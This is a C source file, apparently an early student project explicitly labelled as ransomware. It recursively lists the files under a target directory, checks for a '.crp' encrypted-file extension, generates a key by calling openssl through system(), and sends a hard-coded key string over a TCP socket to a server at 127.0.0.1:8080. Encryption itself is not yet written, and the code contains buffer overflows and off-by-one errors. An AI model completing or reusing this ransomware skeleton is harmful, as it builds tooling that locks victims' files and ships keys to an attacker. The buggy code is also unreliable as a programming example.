#include "ransomlib.h"
#include <dirent.h> // for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>

void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
};

int is_encrypted(char *filename)
// ici on assume que le nom de nos fichiers cryptés seront en ".crp"
{
	int n = strlen(filename)-4;
	char extention[4] ;

	for(int i=0; i<5;i++)
	{
		extention[i] = filename[n+i];
	}

	if(strcmp(extention,".crp")==0)
	{
		printf("Le fichier est déja crypter");
		return 0 ;
	}
	else
	{
		printf("le fichier n'est pas encore crypter");
		return 1;
	}
}

//void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
void listdir(const char *name)
{

	DIR* dir = opendir(name);
	if (dir == NULL)
	{
		return;
	}
	struct dirent* entity;
	entity = readdir(dir);

	//    d_name = entity->d_name;
	//    d_type = entity->d_type;

	while (entity != NULL)
	{
		 if (entity->d_name[0] != '.')
		 {
			printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);
		 }
		if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
		{
			// if(strcmp(d_name, ".")!=0)
			char path[100] = {0};
			strcat(path,name);
			strcat(path,"/");
			strcat(path,entity->d_name);
			listdir(path);
		}
		entity = readdir(dir);
	}
	closedir(dir);
}

//int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int generate_key(int sizeKey)
{
	// int sizeKey[100];
	// printf("Quel est la taille de la clé ? ");
	// scanf("%s", sizeKey);
	
	char buf[100];
	sprintf(buf,"%d", sizeKey);
	
	char command[100];
	stpcpy(command, "openssl rand -hex ");
	strcat(command, buf);
	system(command);
}

//int send_key(char *pKey, char *pIv);
int send_key()
{
	int sockid;
	// char buffer[MAXLINE];
        int server_port = 8080;
        char *server_ip = "127.0.0.1";
	char *hello = "clé : JeSuisVraimentCon";
		
        sockid = socket(AF_INET,SOCK_STREAM,0);

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        server_addr.sin_addr.s_addr = inet_addr(server_ip);

	// connect the client socket to server socket
	if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) 
	{
		printf("Connection with the server failed...\n");
		exit(0);
	}
	else
		printf("Connected to the server !\n");
		send(sockid, (const char *)hello, strlen(hello),0);

        close(sockid);
}

int main (int argc, char * argv[])
{
	usage();
	if(argc==1)
	{
		printf("./e <PATH>");
	}
	else if(argc==2)
	{
		printf("The directory is %s\n", argv[1]);
		listdir(argv[1]);
		generate_key(8);
		send_key();
	}
}
